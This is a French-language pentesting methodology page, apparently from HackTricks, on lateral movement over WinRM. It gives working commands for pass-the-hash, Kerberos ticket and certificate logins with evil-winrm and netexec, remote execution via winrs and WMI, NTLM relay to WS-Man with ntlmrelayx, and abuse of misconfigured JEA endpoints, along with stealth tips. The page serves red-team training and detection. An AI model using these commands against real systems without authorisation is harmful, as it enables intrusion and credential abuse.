# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM est l’un des transports de **lateral movement** les plus pratiques dans les environnements Windows, car il vous donne un shell distant via **WS-Man/HTTP(S)** sans avoir besoin d’astuces de création de service SMB. Si la cible expose **5985/5986** et que votre principal est autorisé à utiliser le remoting, vous pouvez souvent passer de « valid creds » à « interactive shell » très rapidement.

Pour l’**énumération du protocole/service**, les listeners, l’activation de WinRM, `Invoke-Command`, et l’utilisation générique du client, consultez :

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Utilise **HTTP/HTTPS** au lieu de SMB/RPC, donc il fonctionne souvent là où l’exécution de type PsExec est bloquée.
- Avec **Kerberos**, il évite d’envoyer des identifiants réutilisables à la cible.
- Fonctionne proprement depuis des outils **Windows**, **Linux**, et **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Le chemin interactif de PowerShell remoting lance **`wsmprovhost.exe`** sur la cible sous le contexte de l’utilisateur authentifié, ce qui est opérationnellement différent de l’exécution basée sur un service.

## Access model and prerequisites

En pratique, un lateral movement WinRM réussi dépend de **trois** choses :

1. La cible a un **WinRM listener** (`5985`/`5986`) et des règles de pare-feu qui autorisent l’accès.
2. Le compte peut **s’authentifier** sur l’endpoint.
3. Le compte est autorisé à **ouvrir une session de remoting**.

Les façons courantes d’obtenir cet accès :

- **Local Administrator** sur la cible.
- Appartenance à **Remote Management Users** sur les systèmes plus récents ou à **WinRMRemoteWMIUsers__** sur les systèmes/composants qui honorent encore ce groupe.
- Droits de remoting explicitement délégués via les descripteurs de sécurité locaux / modifications des ACL de PowerShell remoting.

Si vous contrôlez déjà une machine avec des droits admin, rappelez-vous que vous pouvez aussi **déléguer l’accès WinRM sans appartenance complète au groupe admin** en utilisant les techniques décrites ici :

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Si vous vous connectez par IP, le client bascule généralement vers **NTLM/Negotiate**.
- En cas de **workgroup** ou de cas limites inter-trust, NTLM nécessite souvent soit **HTTPS**, soit que la cible soit ajoutée à **TrustedHosts** sur le client.
- Avec des **local accounts** via Negotiate dans un workgroup, les restrictions UAC remote peuvent empêcher l’accès à moins d’utiliser le compte Administrator intégré ou `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting utilise par défaut le SPN **`HTTP/<host>`**. Dans les environnements où **`HTTP/<host>`** est déjà enregistré pour un autre compte de service, WinRM Kerberos peut échouer avec `0x80090322`; utilisez un SPN qualifié par port ou basculez vers **`WSMAN/<host>`** là où ce SPN existe.

Si vous obtenez des valid credentials lors d’un password spraying, les valider via WinRM est souvent la manière la plus rapide de vérifier s’ils donnent accès à un shell :

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM pour des shells interactifs

`evil-winrm` reste l’option interactive la plus pratique depuis Linux car il prend en charge les **mots de passe**, les **NT hashes**, les **Kerberos tickets**, les **certificats client**, le transfert de fichiers, ainsi que le chargement en mémoire de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Cas limite Kerberos SPN : `HTTP` vs `WSMAN`

Lorsque le SPN **`HTTP/<host>`** par défaut provoque des échecs Kerberos, essayez de demander/utiliser à la place un ticket **`WSMAN/<host>`**. Cela apparaît dans des configurations d’entreprise durcies ou atypiques où `HTTP/<host>` est déjà associé à un autre compte de service.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Ceci est également utile après un abus de **RBCD / S4U** lorsque vous avez spécifiquement forgé ou demandé un ticket de service **WSMAN** plutôt qu’un ticket générique `HTTP`.

### Authentification basée sur un certificat

WinRM prend également en charge l’**authentification par certificat client**, mais le certificat doit être associé sur la cible à un **compte local**. D’un point de vue offensif, cela est important lorsque :

- vous avez déjà volé/exporté un certificat client valide et sa clé privée déjà associés à WinRM ;
- vous avez abusé de **AD CS / Pass-the-Certificate** pour obtenir un certificat pour un principal, puis pivoter vers un autre chemin d’authentification ;
- vous opérez dans des environnements qui évitent volontairement le remoting basé sur mot de passe.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM est beaucoup moins courant que l’authentification par mot de passe/hash/Kerberos, mais lorsqu’il existe, il peut offrir un chemin de **lateral movement sans mot de passe** qui survit à la rotation des mots de passe.

### Python / automation with `pypsrp`

Si vous avez besoin d’automatisation plutôt que d’un shell d’opérateur, `pypsrp` vous donne WinRM/PSRP depuis Python avec prise en charge de **NTLM**, **certificate auth**, **Kerberos** et **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Si vous avez besoin d'un contrôle plus fin que le wrapper `Client` de haut niveau, les APIs `WSMan` + `RunspacePool` de plus bas niveau sont utiles pour deux problèmes courants d'opérateur :

- forcer **`WSMAN`** comme service/SPN Kerberos au lieu de l'attente `HTTP` par défaut utilisée par de nombreux clients PowerShell ;
- se connecter à un **endpoint PSRP non par défaut** tel qu'une **JEA** / configuration de session personnalisée au lieu de `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Les endpoints PSRP personnalisés et JEA comptent lors du mouvement latéral

Une authentification WinRM réussie ne signifie **pas** toujours que vous arrivez sur l’endpoint `Microsoft.PowerShell` par défaut et non restreint. Les environnements matures peuvent exposer des **configurations de session personnalisées** ou des endpoints **JEA** avec leurs propres ACL et leur propre comportement run-as.

Si vous avez déjà l’exécution de code sur un hôte Windows et que vous voulez comprendre quelles surfaces de remoting existent, énumérez les endpoints enregistrés :
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Lorsqu’un endpoint utile existe, ciblez-le explicitement au lieu du shell par défaut :
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implications offensives pratiques :

- Un endpoint **restreint** peut quand même suffire pour le lateral movement s’il expose juste les cmdlets/fonctions nécessaires pour le contrôle de services, l’accès aux fichiers, la création de processus ou l’exécution arbitraire de commandes .NET / externes.
- Un rôle **JEA mal configuré** est particulièrement intéressant lorsqu’il expose des commandes dangereuses comme `Start-Process`, des wildcards trop larges, des providers inscriptibles, ou des proxy functions personnalisées qui permettent de contourner les restrictions prévues.
- Les endpoints basés sur des **RunAs virtual accounts** ou des **gMSAs** modifient le contexte de sécurité effectif des commandes que vous exécutez. En particulier, un endpoint basé sur gMSA peut fournir une **network identity sur le second hop** même lorsqu’une session WinRM normale rencontrerait le problème classique de délégation.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` est intégré et utile lorsque vous voulez une **exécution native de commandes via WinRM** sans ouvrir une session interactive de PowerShell remoting :
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Deux flags sont faciles à oublier et sont importants en pratique :

- `/noprofile` est souvent requis lorsque le principal distant **n**’est **pas** un administrateur local.
- `/allowdelegate` permet au shell distant d’utiliser vos identifiants contre un **third host** (par exemple, lorsque la commande a besoin de `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Sur le plan opérationnel, `winrs.exe` aboutit souvent à une chaîne de processus distants similaire à :
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Ceci vaut la peine d’être retenu car cela diffère de l’exec basé sur les services et des sessions PSRP interactives.

### `winrm.cmd` / WS-Man COM au lieu de PowerShell remoting

Vous pouvez également exécuter via **WinRM transport** sans `Enter-PSSession` en invoquant des classes WMI via WS-Man. Cela conserve le transport comme WinRM tandis que le primitive d’exécution distante devient **WMI `Win32_Process.Create`** :
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Cette approche est utile lorsque :

- La journalisation PowerShell est fortement surveillée.
- Vous voulez le **WinRM transport** mais pas un workflow classique de remoting PS.
- Vous développez ou utilisez des outils personnalisés autour de l'objet COM **`WSMan.Automation`**.

## NTLM relay vers WinRM (WS-Man)

Lorsque le SMB relay est bloqué par signing et que le LDAP relay est contraint, **WS-Man/WinRM** peut encore être une cible de relay intéressante. `ntlmrelayx.py` moderne inclut des **WinRM relay servers** et peut relayer vers des cibles **`wsman://`** ou **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Deux notes pratiques :

- Relay est le plus utile lorsque la cible accepte **NTLM** et que le principal relayé est autorisé à utiliser WinRM.
- Le code récent d’Impacket gère spécifiquement les requêtes **`WSMANIDENTIFY: unauthenticated`**, donc les sondes de type `Test-WSMan` ne cassent pas le flux du relay.

Pour les contraintes de multi-hop après avoir obtenu une première session WinRM, consulte :

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notes OPSEC et détection

- Le remoting PowerShell interactif crée généralement **`wsmprovhost.exe`** sur la cible.
- **`winrs.exe`** crée couramment **`winrshost.exe`**, puis le processus enfant demandé.
- Les endpoints **JEA** personnalisés peuvent exécuter des actions en tant que comptes virtuels **`WinRM_VA_*`** ou en tant que **gMSA** configuré, ce qui modifie à la fois la télémétrie et le comportement du second saut par rapport à un shell classique dans le contexte d’un utilisateur.
- Attendez-vous à une télémétrie de **network logon**, aux événements du service WinRM, et à la journalisation PowerShell operational/script-block si vous utilisez PSRP plutôt que `cmd.exe` brut.
- Si vous n’avez besoin que d’une seule commande, `winrs.exe` ou une exécution WinRM en une seule fois peut être plus discret qu’une session de remoting interactive longue durée.
- Si Kerberos est disponible, préférez **FQDN + Kerberos** plutôt que IP + NTLM afin de réduire à la fois les problèmes de confiance et les modifications maladroites de `TrustedHosts` côté client.

## Références

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
